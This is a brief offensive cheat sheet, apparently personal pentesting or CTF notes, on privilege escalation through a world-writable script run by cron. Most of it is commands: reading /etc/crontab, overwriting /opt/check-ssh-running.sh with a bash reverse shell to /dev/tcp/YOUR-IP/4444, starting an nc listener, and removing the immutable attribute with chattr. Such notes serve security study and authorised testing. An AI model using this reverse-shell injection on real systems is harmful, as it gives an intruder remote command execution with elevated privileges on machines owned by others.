#### **If a cronjob runs a file in a non-writable directory, but the file itself is writable (777 permissions), you can still modify it using `echo`.**

**List Cron jobs**
```
cat /etc/crontab
```
- `/opt/check-ssh-running.sh:` cron job running

**Check the permission**
```
ls -al /opt/check-ssh-running.sh
```
- `777:` full permission on the file

**Write to the File directly (Injecting a Reverse Shell)**
```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/YOUR-IP/4444 0>&1' > /opt/check-ssh-running.sh

# safer with `exec`
echo -e '#!/bin/bash\nexec bash -i >& /dev/tcp/YOUR-IP/4444 0>&1' > /opt/check-ssh-running.sh
```

**Set up a listener**
```
nc -nvlp 4444
```

### Optional: Check1 - File Attributes (Immutable)
```
lsattr /opt/check-ssh-running.sh
```

**If you see something like this, the file is immutable.**
```
----i--------e-- /opt/check-ssh-running.sh
```

**Remove the immutable bit (Need root for this)**
```
sudo chattr -i /opt/check-ssh-running.sh
```

#### **Check2**
Also check the contents of the file and look for any vulnerable commands, e.g. `grep`, `awk` etc.